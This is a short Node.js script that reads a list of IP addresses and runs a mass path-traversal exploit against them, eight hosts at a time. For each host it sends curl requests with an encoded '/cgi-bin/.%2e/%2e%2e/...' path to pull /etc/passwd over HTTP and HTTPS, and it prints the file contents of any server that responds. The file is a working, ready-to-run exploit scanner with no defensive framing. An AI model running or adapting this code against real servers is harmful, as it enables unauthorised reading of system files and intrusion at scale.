const fs = require('fs')
const { spawn } = require('child_process')
const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
function spawnAsync(...args) {
  return new Promise((resolve, reject) => {
    const cmd = spawn(...args)
    const result = {
      pid: undefined,
      stdout: Buffer.from([]),
      stderr: Buffer.from([]),
      status: null,
      signal: null,
      error: null
    }

    let resolved = false
    const resolver = () => {
      if (resolved) return
      resolved = true
      result.pid = cmd.pid
      try{
        cmd.kill('SIGKILL')
      }catch(e){}
      resolve(result)
    }

    cmd.stdout.on('data', d => {
      result.stdout = Buffer.concat([result.stdout, d])
    })
    cmd.stderr.on('data', d => {
      result.stderr = Buffer.concat([result.stderr, d])
    })

    const onClose = (code, signal) => {
      result.status = code
      result.signal = signal
      resolver()
    }

    cmd.on('close', onClose)
    cmd.on('exit', onClose)

    cmd.on('error', e => {
      result.error = e
      resolver()
    })

  })
}
async function exploit(ip) {
  // linux
  let result = await spawnAsync('curl', ['--path-as-is', 'http://'+ip+'/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd', '-k', '-o', '-'])
  let output = result.stdout.toString()
  if (~output.indexOf(`0:0:root`)) {
    console.log(ip, output)
    return
  }

  result = await spawnAsync('curl', ['--path-as-is', 'https://'+ip+'/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd', '-k', '-o', '-'])
  output = result.stdout.toString()
  if (~output.indexOf(`0:0:root`)) {
    console.log(ip, output)
    return
  }
  console.log(ip, 'not vuln')
}

!(async () => {
  const lines = fs.readFileSync(process.argv[2]).toString().split(/[\r\n]+/)
  let free = 8
  while (true) {
    if (free < 1) {
      await delay(100)
      continue
    }
    const line = lines.shift().trim()
    if (!line) continue
    free--
    exploit(line).catch(e => console.error(line, e)).then(() => free++)
  }
})()